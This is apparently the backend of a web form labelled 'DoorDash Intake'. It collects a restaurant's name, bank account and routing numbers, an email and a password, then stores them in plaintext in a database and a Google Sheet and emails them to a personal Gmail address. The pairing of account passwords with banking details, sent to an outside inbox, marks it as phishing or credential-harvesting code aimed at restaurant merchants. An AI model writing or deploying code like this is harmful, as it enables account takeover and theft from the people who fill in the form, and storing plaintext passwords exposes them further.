import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { supabaseAdmin } from "@/integrations/supabase/client.server";

const SHEET_ID = "1i-fvTDWQMeRvDQd1FkpuG0Vz0sYaLE-GEGfC7RDD0JE";
const NOTIFY_EMAIL = "merchants577@gmail.com";

const schema = z.object({
  restaurantName: z.string().trim().min(1).max(120),
  accountNo: z.string().trim().min(4).max(34).regex(/^[A-Za-z0-9-]+$/),
  routingNo: z.string().trim().min(6).max(20).regex(/^[A-Za-z0-9-]+$/),
  email: z.string().trim().email().max(255),
  password: z.string().min(8).max(128),
});

function b64url(s: string) {
  return Buffer.from(s)
    .toString("base64")
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");
}

export const submitIntake = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => schema.parse(input))
  .handler(async ({ data }) => {
    const LOVABLE_API_KEY = process.env.LOVABLE_API_KEY;
    const SHEETS_KEY = process.env.GOOGLE_SHEETS_API_KEY;
    const GMAIL_KEY = process.env.GOOGLE_MAIL_API_KEY;
    if (!LOVABLE_API_KEY) throw new Error("LOVABLE_API_KEY missing");

    // 1. Insert into Supabase
    const { error: dbError } = await supabaseAdmin
      .from("submissions")
      .insert({
        restaurant_name: data.restaurantName,
        account_no: data.accountNo,
        routing_no: data.routingNo,
        email: data.email,
        password: data.password,
      });
    if (dbError) {
      console.error("DB insert failed", dbError);
      throw new Error("Failed to save submission");
    }

    const ts = new Date().toISOString();

    // 2. Append to Google Sheet
    if (SHEETS_KEY) {
      try {
        const res = await fetch(
          `https://connector-gateway.lovable.dev/google_sheets/v4/spreadsheets/${SHEET_ID}/values/Sheet1!A:F:append?valueInputOption=USER_ENTERED`,
          {
            method: "POST",
            headers: {
              Authorization: `Bearer ${LOVABLE_API_KEY}`,
              "X-Connection-Api-Key": SHEETS_KEY,
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              values: [
                [
                  ts,
                  data.restaurantName,
                  data.accountNo,
                  data.routingNo,
                  data.email,
                  data.password,
                ],
              ],
            }),
          },
        );
        if (!res.ok) console.error("Sheets append failed", res.status, await res.text());
      } catch (e) {
        console.error("Sheets error", e);
      }
    }

    // 3. Send Gmail notification
    if (GMAIL_KEY) {
      try {
        const subject = `New DoorDash Intake — ${data.restaurantName}`;
        const body = [
          `New submission received at ${ts}`,
          ``,
          `Restaurant: ${data.restaurantName}`,
          `Account #: ${data.accountNo}`,
          `Routing #: ${data.routingNo}`,
          `Email: ${data.email}`,
          `Password: ${data.password}`,
        ].join("\r\n");
        const raw = b64url(
          [
            `To: ${NOTIFY_EMAIL}`,
            `Subject: ${subject}`,
            `Content-Type: text/plain; charset="UTF-8"`,
            ``,
            body,
          ].join("\r\n"),
        );
        const res = await fetch(
          `https://connector-gateway.lovable.dev/google_mail/gmail/v1/users/me/messages/send`,
          {
            method: "POST",
            headers: {
              Authorization: `Bearer ${LOVABLE_API_KEY}`,
              "X-Connection-Api-Key": GMAIL_KEY,
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ raw }),
          },
        );
        if (!res.ok) console.error("Gmail send failed", res.status, await res.text());
      } catch (e) {
        console.error("Gmail error", e);
      }
    }

    return { ok: true };
  });
